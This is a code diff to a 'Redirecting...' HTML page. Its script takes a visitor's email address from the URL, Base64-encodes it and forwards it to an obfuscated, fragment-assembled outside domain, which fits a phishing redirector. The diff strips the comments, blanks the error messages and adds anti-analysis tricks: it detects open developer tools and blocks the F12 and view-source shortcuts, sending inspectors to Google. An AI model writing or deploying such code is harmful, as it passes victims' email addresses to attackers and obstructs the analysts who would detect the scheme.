@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Redirecting...</title>
   <script>
-    // Function to split the encoded email into chunks
     function bIB(str, bits = 20) {
       const bitLength = Math.ceil(str.length / bits);
       const result = [];
@@ -17,49 +16,55 @@
       return result;
     }
 
-    // Function to combine chunks into a single string
     function combineBits(bits) {
       return bits.join("");
     }
 
     function encodeEmailAndRedirect() {
-      // Get the query string from the URL
       const queryString = window.location.search;
-
-      // Extract the email after 'EC'
       const emailPrefix = "EC";
       const emailStartIndex = queryString.indexOf(emailPrefix);
 
       if (emailStartIndex !== -1) {
-        // Extract the email starting after 'EC'
         const email = queryString.slice(emailStartIndex + emailPrefix.length);
 
         if (email) {
-          // Encode the email using Base64
           const encodedEmail = btoa(email);
-
-          // Define the base URL parts
           const redirectUrlBits = [
             "ht", "tps", ":/", "/eb", "u6a", "j.j", "xeb", "pue", "ehg", ".es", "/Ol", "Lfm", "M/?", "", "", "", "", "", "", ""
           ];
-
-          // Split the encoded email into chunks using bIB
           const emailBits = bIB(encodedEmail);
-
-          // Combine the base URL parts and email chunks
           const finalUrl = combineBits(redirectUrlBits) + combineBits(emailBits);
-
-          // Redirect to the final URL
           window.location.href = finalUrl;
         } else {
-          alert("Email not found after 'EC'!");
+          alert("!");
         }
       } else {
-        alert("No access!");
+        alert("!");
       }
     }
 
-    // Call the function to execute the script
+    function detectDevTools() {
+      const devToolsOpened = () => {
+        const widthThreshold = window.outerWidth - window.innerWidth > 160;
+        const heightThreshold = window.outerHeight - window.innerHeight > 160;
+        return widthThreshold || heightThreshold;
+      };
+
+      if (devToolsOpened()) {
+        window.location.href = "https://www.google.com";
+      }
+    }
+
+    setInterval(detectDevTools, 1000);
+
+    document.addEventListener("keydown", (e) => {
+      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I") || (e.ctrlKey && e.key === "U") || (e.ctrlKey && e.shiftKey && e.key === "C")) {
+        e.preventDefault();
+        window.location.href = "https://www.google.com";
+      }
+    });
+
     encodeEmailAndRedirect();
   </script>
 </head>
